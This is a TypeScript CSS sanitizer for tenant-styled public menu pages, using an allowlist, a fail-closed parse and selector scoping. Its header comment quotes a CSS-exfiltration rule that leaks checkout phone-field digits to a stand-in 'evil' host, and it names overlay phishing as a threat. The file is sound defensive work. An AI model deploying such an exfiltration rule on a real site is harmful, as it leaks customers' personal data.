import * as csstree from "css-tree";

import { MENU_CSS_SCOPE_CLASS } from "@spruvex-r/types";

/**
 * Sanitizes tenant-submitted CSS for the public digital-menu "custom design"
 * option (apps/ordering). This runs on genuinely untrusted input — any
 * signed-in owner (or a compromised owner account, or a developer they
 * hired) can submit it, and the result is served, unauthenticated, on a page
 * visited by paying customers who may be mid-checkout (a phone-number
 * field). Fails CLOSED: anything not on the allowlist below rejects the
 * whole submission with a specific reason, rather than silently stripping —
 * a tenant who thinks their design applied, when parts of it silently
 * vanished, is a worse outcome than a rejected save with a clear error.
 *
 * Threats specifically ruled out by the rules below:
 * - `url(...)` anywhere (any property, @font-face, @import) — blocks the
 *   classic `input[value^="1"] { background: url(https://evil/log?1) }`
 *   CSS-exfiltration attack against the checkout phone field, plus
 *   tracking pixels/beacons and remote-stylesheet loading.
 * - `position: fixed | sticky` and `z-index` — blocks full-viewport
 *   phishing overlays impersonating the real checkout UI.
 * - the `content` property — blocks generated-content string/url tricks.
 * - every at-rule (@import, @font-face, @keyframes, @media, ...) — smallest
 *   safe surface; each one either loads a remote resource or isn't needed
 *   for a color/spacing/typography restyle.
 * - every declaration property must be on an explicit allowlist (deny by
 *   default), not a blocklist — a blocklist only covers what we thought of.
 * - every selector is rewritten to be scoped under `.spx-menu-custom` as an
 *   ancestor combinator, so no selector — however it's written, including
 *   bare `body`/`html`/attribute selectors — can ever match anything
 *   outside the menu page's own render tree.
 * - a hard length cap (DoS via a giant stylesheet) and a fail-closed parse:
 *   any parse error, or any node the parser couldn't fully understand
 *   (css-tree's `Raw` fallback), rejects the whole thing.
 */

export { MENU_CSS_SCOPE_CLASS };

const MAX_CSS_LENGTH = 20_000;

const ALLOWED_PROPERTIES = new Set([
  "color",
  "background-color",
  "background",
  "border",
  "border-color",
  "border-width",
  "border-style",
  "border-radius",
  "border-top",
  "border-right",
  "border-bottom",
  "border-left",
  "box-shadow",
  "padding",
  "padding-top",
  "padding-right",
  "padding-bottom",
  "padding-left",
  "margin",
  "margin-top",
  "margin-right",
  "margin-bottom",
  "margin-left",
  "gap",
  "row-gap",
  "column-gap",
  "width",
  "max-width",
  "min-width",
  "height",
  "max-height",
  "min-height",
  "display",
  "flex",
  "flex-direction",
  "flex-wrap",
  "flex-grow",
  "flex-shrink",
  "justify-content",
  "justify-items",
  "align-items",
  "align-self",
  "align-content",
  "grid-template-columns",
  "text-align",
  "vertical-align",
  "font-family",
  "font-size",
  "font-weight",
  "font-style",
  "line-height",
  "letter-spacing",
  "text-transform",
  "text-decoration",
  "text-shadow",
  "white-space",
  "text-overflow",
  "overflow",
  "object-fit",
  "opacity",
  "transition",
  "transform",
  "box-sizing",
  "aspect-ratio",
  "cursor",
  "position",
]);

const BLOCKED_POSITION_VALUES = new Set(["fixed", "sticky"]);

export class InvalidMenuCssError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "InvalidMenuCssError";
  }
}

/**
 * Parses, validates, and re-serializes tenant CSS, rewriting every selector
 * to be scoped under `.${MENU_CSS_SCOPE_CLASS}`. Returns "" for blank input.
 * Throws InvalidMenuCssError (safe to surface to the tenant as-is) on
 * anything not allowed.
 */
export function sanitizeMenuCss(rawCss: string): string {
  const css = rawCss.trim();
  if (css.length === 0) {
    return "";
  }
  if (css.length > MAX_CSS_LENGTH) {
    throw new InvalidMenuCssError(`CSS must be under ${MAX_CSS_LENGTH} characters`);
  }

  const parseErrors: string[] = [];
  let ast: csstree.CssNode;
  try {
    ast = csstree.parse(css, {
      positions: false,
      onParseError: (error) => parseErrors.push(error.message),
    });
  } catch (error) {
    throw new InvalidMenuCssError(error instanceof Error ? error.message : "Could not parse CSS");
  }
  if (parseErrors.length > 0) {
    throw new InvalidMenuCssError(parseErrors[0]);
  }

  csstree.walk(ast, (node) => {
    if (node.type === "Atrule") {
      throw new InvalidMenuCssError(`@-rules are not allowed ("@${node.name}")`);
    }
    if (node.type === "Raw") {
      throw new InvalidMenuCssError("Unrecognized or malformed CSS");
    }
    if (node.type === "Url") {
      throw new InvalidMenuCssError("url(...) is not allowed in custom menu CSS");
    }
    if (node.type === "Declaration") {
      const property = node.property.toLowerCase();
      if (property === "content") {
        throw new InvalidMenuCssError('The "content" property is not allowed');
      }
      if (property === "z-index") {
        throw new InvalidMenuCssError('The "z-index" property is not allowed');
      }
      if (!ALLOWED_PROPERTIES.has(property)) {
        throw new InvalidMenuCssError(`Property "${node.property}" is not allowed`);
      }
      if (property === "position") {
        csstree.walk(node.value, (valueNode) => {
          if (
            valueNode.type === "Identifier" &&
            BLOCKED_POSITION_VALUES.has(valueNode.name.toLowerCase())
          ) {
            throw new InvalidMenuCssError('position: fixed/sticky is not allowed');
          }
        });
      }
    }
  });

  // Scope every selector under .spx-menu-custom as an ancestor combinator —
  // whatever the tenant wrote (bare tags, ids, attribute selectors), it can
  // now only ever match inside the menu page's own render tree.
  csstree.walk(ast, {
    visit: "Rule",
    enter(rule) {
      const prelude = rule.prelude;
      if (!prelude || prelude.type !== "SelectorList") return;
      for (const selector of prelude.children) {
        if (selector.type !== "Selector") continue;
        selector.children.prependData({ type: "Combinator", name: " " });
        selector.children.prependData({ type: "ClassSelector", name: MENU_CSS_SCOPE_CLASS });
      }
    },
  });

  const sanitized = csstree.generate(ast);
  // Belt-and-suspenders: the output is regenerated from validated tokens
  // (no string literals survive — `content` is banned above), so this
  // normally can't fire; it guards a </style> breakout if it ever did.
  return sanitized.replace(/<\/style/gi, "");
}
